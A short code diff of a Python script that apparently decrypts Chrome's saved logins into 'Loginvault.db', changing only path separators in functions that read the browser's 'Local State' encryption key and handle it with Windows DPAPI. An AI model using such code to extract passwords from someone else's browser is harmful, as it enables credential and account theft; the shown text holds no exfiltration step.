@@ -11,7 +11,7 @@ import csv
 
 DST_DB = "Loginvault.db"
 def get_secret_key_from_file(path):
-    with open(fr'{path}\secret', "rb") as secret_file:
+    with open(fr'{path}/secret', "rb") as secret_file:
         secret_key = secret_file.read()
         secret_key = win32crypt.CryptProtectData(secret_key)
         secret_key = (base64.b64encode(b"DPAPI" + secret_key)).decode("utf-8")
@@ -19,7 +19,7 @@ def get_secret_key_from_file(path):
 
 
 def write_secret_key_to_file(path, secret_key):
-    CHROME_PATH_LOCAL_STATE = fr'{path}\Local State'
+    CHROME_PATH_LOCAL_STATE = fr'{path}/Local State'
     with open(CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
         local_state = f.read()
         local_state = json.loads(local_state)
@@ -37,7 +37,7 @@ def encrypt_secret_key(secret_key):
 
 
 def get_secret_key(path):
-    CHROME_PATH_LOCAL_STATE = fr'{path}\Local State'
+    CHROME_PATH_LOCAL_STATE = fr'{path}/Local State'
 
     try:
         # (1) Get secretkey from chrome local state
@@ -105,7 +105,7 @@ def do_decrypt(path: str) -> str:
             write_secret_key_to_file(path, key)
             secret_key = get_secret_key(path)
 
-        with open(fr'{path}\secret', "wb") as secret_file:
+        with open(fr'{path}/secret', "wb") as secret_file:
             if secret_key != "":
                 secret_file.write(secret_key)
             else:
